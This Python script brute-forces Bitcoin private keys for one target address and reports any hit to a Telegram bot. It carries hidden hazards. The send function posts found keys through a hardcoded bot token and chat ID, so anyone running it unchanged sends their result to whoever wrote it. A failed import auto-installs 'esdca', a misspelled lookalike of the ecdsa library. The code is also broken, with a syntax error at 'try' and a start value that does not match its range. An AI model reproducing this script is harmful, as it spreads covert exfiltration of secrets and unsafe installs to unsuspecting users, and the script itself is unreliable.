import random, os

try
   import esdca
   import base58
except:
   os.system("pip install base58 esdca")

from ecdsa import SECP256k1, SigningKey
import hashlib
import base58
from multiprocessing import Pool, Value, Lock
import os
# Target Bitcoin address
target_address = "1BY8GQbnueYofwSuFAT3USAhGjPrkxDdW9"

# Range of private keys
start_value = 40000000000000000
end_value = 0x7ffffffffffffffff
print(end_value)
# Random search flag
random_search = True

# Shared variables for process-safe counters
total_keys = Value('i', 0)
lock = Lock()

def pubkey_to_address(pubkey, compressed=False):
    if compressed:
        prefix = b'\x02' if pubkey[-1] % 2 == 0 else b'\x03'
        pubkey = prefix + pubkey[:32]
    else:
        pubkey = b'\x04' + pubkey  # Uncompressed public key prefix
    sha256 = hashlib.sha256(pubkey).digest()
    ripemd160 = hashlib.new('ripemd160', sha256).digest()
    prefix = b'\x00'  # Mainnet prefix
    address = prefix + ripemd160
    checksum = hashlib.sha256(hashlib.sha256(address).digest()).digest()[:4]
    return base58.b58encode(address + checksum).decode('utf-8')

def check_private_key(private_key_int):
    try:
        private_key = SigningKey.from_secret_exponent(private_key_int, curve=SECP256k1)
        public_key = private_key.get_verifying_key()
        public_key_bytes = public_key.to_string()
        address = pubkey_to_address(public_key_bytes, compressed=True)
        return address == target_address
    except Exception as e:
        print(f"Error with private key {private_key_int}: {e}")
        return False

def worker_process():
    global total_keys
    while True:
        private_key_int = random.randint(start_value, end_value) if random_search else start_value
        with lock:
            total_keys.value += 1
            if total_keys.value % 1000 == 0:
                progress = total_keys.value if end_value - start_value == 0 else (total_keys.value / (end_value - start_value)) * 100
                print(f"Keys searched: {total_keys.value}, Progress: {progress:.8f}%", end="\r")
        if check_private_key(private_key_int):
            return private_key_int

import requests
import os

def is_network_available():
    try:
        # Check if we can access a reliable site (e.g., Google's DNS)
        response = requests.get("https://www.google.com", timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def send(key):
    BOT_TOKEN = '6412210867:AAGk-qyRnAfzx7wAvH31oGwW4MQrPG7N4Ig'  # Replace with your bot token
    CHAT_ID = '6971953231'  # Replace with your chat ID
    message = f"Hoorey Got Bitcoin Private Key : {key}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    if is_network_available():
        params = {
            'chat_id': CHAT_ID,
            'text': message
        }
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            with open("saved_keys.txt", "a") as file:
              file.write(f"{key}\n")
            print(f"Failed to send message. Status code: {response.status_code}")
    else:
        # If network is not available, save the key in a file
        with open("saved_keys.txt", "a") as file:
            file.write(f"{key}\n")
        print(f"Network unavailable. Key saved in 'saved_keys.txt': {key}")
"""
def main():
    with Pool(processes=4) as pool:
        result_objects = [pool.apply_async(worker_process) for _ in range(4)]
        
        for result in result_objects:
            private_key = result.get()
            if private_key:
                print(f"\nFound private key: {private_key:064x}")
                send(f"{private_key:064x}")
                pool.terminate()
                pool.join()
                break
"""
import os
from multiprocessing import Pool

def main():
    num_threads = os.cpu_count()  # Automatically detect number of CPU threads
    print(f"Cpu Count: {num_threads}")
    with Pool(processes=num_threads) as pool:
        result_objects = [pool.apply_async(worker_process) for _ in range(num_threads)]

        for result in result_objects:
            private_key = result.get()
            if private_key:
                print(f"\nFound private key: {private_key:064x}")
                send(f"{private_key:064x}")
                pool.terminate()
                pool.join()
                break

if __name__ == "__main__":
    main()
